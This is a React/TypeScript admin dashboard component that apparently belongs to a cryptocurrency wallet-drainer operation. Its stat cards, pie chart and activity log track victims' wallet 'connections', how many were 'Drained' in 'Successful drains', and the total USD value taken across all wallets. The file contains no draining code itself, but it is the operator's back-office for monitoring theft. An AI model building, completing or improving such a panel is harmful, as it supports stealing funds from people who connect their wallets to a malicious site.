import { trpc } from "@/lib/trpc";
import { useAuth } from "@/_core/hooks/useAuth";
import { getLoginUrl } from "@/const";
import {
  AreaChart, Area, XAxis, YAxis, CartesianGrid, Tooltip, ResponsiveContainer,
  BarChart, Bar, PieChart, Pie, Cell,
} from "recharts";

const COLORS = ["#FF2D78", "#00E5FF", "#AB47BC", "#66BB6A", "#FFA726"];

function StatCard({ label, value, sub, color }: { label: string; value: string | number; sub?: string; color: "pink" | "cyan" | "purple" | "green" }) {
  const colorMap = {
    pink: "var(--neon-pink)",
    cyan: "var(--neon-cyan)",
    purple: "var(--neon-purple)",
    green: "oklch(0.75 0.25 145)",
  };
  return (
    <div className="stat-card rounded-lg">
      <p className="text-xs text-muted-foreground uppercase tracking-widest mb-2" style={{ fontFamily: 'Share Tech Mono' }}>
        {label}
      </p>
      <p className="text-3xl font-black" style={{ color: colorMap[color], fontFamily: 'Orbitron', textShadow: `0 0 15px ${colorMap[color]}80` }}>
        {value}
      </p>
      {sub && <p className="text-xs text-muted-foreground mt-1" style={{ fontFamily: 'Rajdhani' }}>{sub}</p>}
    </div>
  );
}

export default function Dashboard() {
  const { user, isAuthenticated, loading } = useAuth();

  const { data: stats } = trpc.admin.getDashboardStats.useQuery(undefined, { enabled: isAuthenticated });
  const { data: chartData } = trpc.admin.getChartData.useQuery(undefined, { enabled: isAuthenticated });
  const { data: recentActivity } = trpc.admin.getRecentActivity.useQuery(undefined, { enabled: isAuthenticated });

  if (loading) {
    return (
      <div className="flex items-center justify-center h-64">
        <div className="text-center">
          <div className="w-8 h-8 border-2 border-primary border-t-transparent rounded-full animate-spin mx-auto mb-3" />
          <p className="text-xs text-muted-foreground" style={{ fontFamily: 'Share Tech Mono' }}>Loading...</p>
        </div>
      </div>
    );
  }

  if (!isAuthenticated) {
    return (
      <div className="flex flex-col items-center justify-center h-64 gap-4">
        <p className="text-lg font-bold neon-text-pink" style={{ fontFamily: 'Orbitron' }}>ACCESS DENIED</p>
        <p className="text-sm text-muted-foreground">Authentication required to access admin panel</p>
        <a href={getLoginUrl()} className="cyber-btn-pink px-6 py-2.5 rounded-lg font-bold text-sm"
          style={{ fontFamily: 'Orbitron' }}>
          LOGIN →
        </a>
      </div>
    );
  }

  const connections = stats?.connections;
  const transactions = stats?.transactions;

  const pieData = [
    { name: "Connected", value: connections?.connected ?? 0 },
    { name: "Drained", value: connections?.drained ?? 0 },
    { name: "Failed", value: connections?.failed ?? 0 },
  ];

  const formattedChart = (chartData ?? []).map((d: { date: string; connections: number; usdValue: string }) => ({
    date: new Date(d.date).toLocaleDateString("en", { month: "short", day: "numeric" }),
    connections: Number(d.connections),
    usdValue: parseFloat(d.usdValue ?? "0"),
  }));

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-black neon-text-cyan" style={{ fontFamily: 'Orbitron' }}>
            DASHBOARD
          </h1>
          <p className="text-xs text-muted-foreground mt-1" style={{ fontFamily: 'Share Tech Mono' }}>
            Real-time overview — {new Date().toLocaleString()}
          </p>
        </div>
        <div className="flex items-center gap-2 px-3 py-1.5 rounded border text-xs"
          style={{ borderColor: 'oklch(0.75 0.25 145 / 0.4)', color: 'oklch(0.75 0.25 145)', fontFamily: 'Share Tech Mono' }}>
          <span className="w-2 h-2 rounded-full animate-pulse-neon" style={{ background: 'oklch(0.75 0.25 145)' }} />
          LIVE
        </div>
      </div>

      {/* Stats Grid */}
      <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
        <StatCard
          label="Total Connections"
          value={connections?.total ?? 0}
          sub="All time"
          color="cyan"
        />
        <StatCard
          label="Drained"
          value={connections?.drained ?? 0}
          sub="Successful drains"
          color="pink"
        />
        <StatCard
          label="Total USD Value"
          value={`$${parseFloat(connections?.totalUsdValue ?? "0").toLocaleString()}`}
          sub="Across all wallets"
          color="green"
        />
        <StatCard
          label="Transactions"
          value={transactions?.total ?? 0}
          sub={`${transactions?.success ?? 0} success`}
          color="purple"
        />
      </div>

      {/* Charts Row */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Area Chart */}
        <div className="lg:col-span-2 cyber-card rounded-lg p-5">
          <h3 className="text-sm font-bold neon-text-cyan mb-4" style={{ fontFamily: 'Orbitron' }}>
            CONNECTIONS (7 DAYS)
          </h3>
          {formattedChart.length > 0 ? (
            <ResponsiveContainer width="100%" height={200}>
              <AreaChart data={formattedChart}>
                <defs>
                  <linearGradient id="colorConn" x1="0" y1="0" x2="0" y2="1">
                    <stop offset="5%" stopColor="#FF2D78" stopOpacity={0.3} />
                    <stop offset="95%" stopColor="#FF2D78" stopOpacity={0} />
                  </linearGradient>
                </defs>
                <CartesianGrid strokeDasharray="3 3" stroke="oklch(0.18 0.04 240)" />
                <XAxis dataKey="date" tick={{ fill: 'oklch(0.55 0.05 220)', fontSize: 11, fontFamily: 'Share Tech Mono' }} />
                <YAxis tick={{ fill: 'oklch(0.55 0.05 220)', fontSize: 11, fontFamily: 'Share Tech Mono' }} />
                <Tooltip
                  contentStyle={{ background: 'oklch(0.07 0.015 240)', border: '1px solid oklch(0.72 0.28 320 / 0.4)', borderRadius: '8px', fontFamily: 'Share Tech Mono', fontSize: 12 }}
                />
                <Area type="monotone" dataKey="connections" stroke="#FF2D78" strokeWidth={2} fill="url(#colorConn)" />
              </AreaChart>
            </ResponsiveContainer>
          ) : (
            <div className="h-48 flex items-center justify-center text-muted-foreground text-sm" style={{ fontFamily: 'Share Tech Mono' }}>
              No data yet
            </div>
          )}
        </div>

        {/* Pie Chart */}
        <div className="cyber-card rounded-lg p-5">
          <h3 className="text-sm font-bold neon-text-pink mb-4" style={{ fontFamily: 'Orbitron' }}>
            STATUS BREAKDOWN
          </h3>
          {pieData.some(d => d.value > 0) ? (
            <>
              <ResponsiveContainer width="100%" height={160}>
                <PieChart>
                  <Pie data={pieData} cx="50%" cy="50%" innerRadius={40} outerRadius={70} dataKey="value" strokeWidth={0}>
                    {pieData.map((_, index) => (
                      <Cell key={index} fill={COLORS[index % COLORS.length]} />
                    ))}
                  </Pie>
                  <Tooltip
                    contentStyle={{ background: 'oklch(0.07 0.015 240)', border: '1px solid oklch(0.72 0.28 320 / 0.4)', borderRadius: '8px', fontFamily: 'Share Tech Mono', fontSize: 12 }}
                  />
                </PieChart>
              </ResponsiveContainer>
              <div className="space-y-1.5 mt-2">
                {pieData.map((d, i) => (
                  <div key={d.name} className="flex items-center justify-between text-xs">
                    <div className="flex items-center gap-2">
                      <div className="w-2 h-2 rounded-full" style={{ background: COLORS[i] }} />
                      <span className="text-muted-foreground" style={{ fontFamily: 'Share Tech Mono' }}>{d.name}</span>
                    </div>
                    <span className="font-bold" style={{ color: COLORS[i], fontFamily: 'Orbitron' }}>{d.value}</span>
                  </div>
                ))}
              </div>
            </>
          ) : (
            <div className="h-48 flex items-center justify-center text-muted-foreground text-sm" style={{ fontFamily: 'Share Tech Mono' }}>
              No data yet
            </div>
          )}
        </div>
      </div>

      {/* Recent Activity */}
      <div className="cyber-card rounded-lg p-5">
        <h3 className="text-sm font-bold neon-text-cyan mb-4" style={{ fontFamily: 'Orbitron' }}>
          RECENT ACTIVITY
        </h3>
        {recentActivity && recentActivity.length > 0 ? (
          <div className="space-y-2">
            {recentActivity.map((log: { id: number; level: string; action: string; description?: string | null; walletAddress?: string | null; createdAt: Date }) => (
              <div key={log.id} className="flex items-start gap-3 py-2 border-b border-border last:border-0">
                <span className={`text-xs px-2 py-0.5 rounded mt-0.5 flex-shrink-0 ${
                  log.level === 'success' ? 'badge-success' :
                  log.level === 'error' ? 'badge-error' :
                  log.level === 'warning' ? 'badge-warning' : 'badge-info'
                }`}>
                  {log.level}
                </span>
                <div className="flex-1 min-w-0">
                  <p className="text-sm font-medium" style={{ fontFamily: 'Rajdhani' }}>{log.action}</p>
                  {log.description && (
                    <p className="text-xs text-muted-foreground truncate" style={{ fontFamily: 'Share Tech Mono' }}>
                      {log.description}
                    </p>
                  )}
                </div>
                <span className="text-xs text-muted-foreground flex-shrink-0" style={{ fontFamily: 'Share Tech Mono' }}>
                  {new Date(log.createdAt).toLocaleTimeString()}
                </span>
              </div>
            ))}
          </div>
        ) : (
          <div className="text-center py-8 text-muted-foreground text-sm" style={{ fontFamily: 'Share Tech Mono' }}>
            No activity yet
          </div>
        )}
      </div>
    </div>
  );
}
